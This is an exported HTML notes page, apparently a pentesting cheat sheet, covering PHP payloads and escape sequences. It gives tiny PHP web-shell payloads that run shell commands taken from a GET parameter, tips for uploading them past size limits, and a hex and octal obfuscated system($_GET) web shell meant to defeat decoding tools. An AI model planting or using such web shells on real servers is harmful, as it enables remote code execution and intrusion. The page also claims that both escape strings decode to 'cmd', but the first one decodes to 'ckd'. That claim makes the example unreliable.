<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PHP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PHP</h1><br/><p><h1>Payloads</h1></p><p><a name="Tiny Payload"></a><h2>Tiny Payload</h2></p><p>Sometimes a smaller payload is more likely to work (i.e. if the target has a size restriction for uploads). The smallest payloads that I know are as follows.</p><p></p><p><strong>&lt;?=</strong> is short for <strong>&lt;?php echo</strong></p><p></p><p><strong>`</strong>...<strong>`</strong> Backticks in PHP are used to execute a command in the system&#39;s shell.</p><p></p><p><strong>$_GET[0]</strong> means that the web page will take the value of the <strong>0</strong> parameter from a <strong>GET</strong> Request sent to this URL.</p><p></p><p>A GET Request like <strong>https://xample.com/shell.php?0=whoami</strong> should execute the command &amp; print the output on the screen. You can also try pinging yourself if no output is being shown.</p><p></p><p><h3>Standalone Payload</h3></p><p>If the PHP is complete (as this is), &amp; the file doesn&#39;t contain any other content (e.g. HTML), you <span style="color:#ff0000;">can omit the closing tags</span> <strong>?&gt;</strong>. The PHP Interpretter will just end the script after running the code.</p><p></p><p><em>&lt;?=`$_GET[0]`</em></p><p></p><p><h3>Embedded Payload</h3></p><p>If the payload is being embedded into some other content (e.g. for a Polyglot or injected into an existing PHP file), you need to include the closing tags <strong>?&gt;</strong>.</p><p></p><p></p><p><em>&lt;?=`$_GET[0]`?&gt;</em></p><p></p><p><h2>Troubleshooting Payloads</h2></p><p>If RCE isn&#39;t working on a PHP Server, try just executing <strong>phpinfo()</strong> by itself. Among other things, it will tell you if the Web App is blocking certain functions (e.g.<strong> system()</strong> ).</p><p></p><p><a name="Escape Sequences"></a><h1>Escape Sequences</h1></p><p>[CTF D 20-21]</p><p></p><p>See the <a href="https://www.php.net/manual/en/regexp.reference.escape.php">PHP Docs</a></p><p></p><p><h2>Hex &amp; Octal</h2></p><p>In addition to normal Escape Sequences (e.g. <strong>\n</strong> ), Escape Sequences can also be in Hexadecimal or Octal format.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: For <span style="color:#ff0000;">Obfuscation</span>, sometimes <span style="color:#ff0000;">Hex &amp; Octal</span> Escape Sequences are <span style="color:#ff0000;">combined</span>. This trips up certain decoding tools (e.g. Cyberchef or Burp Decoder) which assume that these characters are using the same encoding method.</p><p></p><p><h3>Decoding</h3></p><p>PHP automatically translates Escape Sequences into their corresponding ASCII characters, which is why Hex + Octal Encoding is commonly used for Obfuscation.</p><p></p><p>In the following example, both sets of Escape Sequences translate to the same thing (so the output from your echo command is &quot;cmd:cmd&quot;).</p><p></p><p><strong>if (isset($_GET[&quot;</strong><strong><span style="color:#ff0000;">\143\153\x64</span></strong><strong>&quot;])) { system($_GET[&quot;</strong><strong><span style="color:#ff0000;">\143\x6d\144</span></strong><strong>&quot;]);}</strong></p><p></p><p><em>php -r ‘echo “\143\153\x64” . “:” . “\143\x6d\144” . “\n”;’</em></p><p></p><p><h1>String Manipulation</h1></p><p><h2>Concatination</h2></p><p>Periods are used to concat strings</p></div>
</body>
</html>
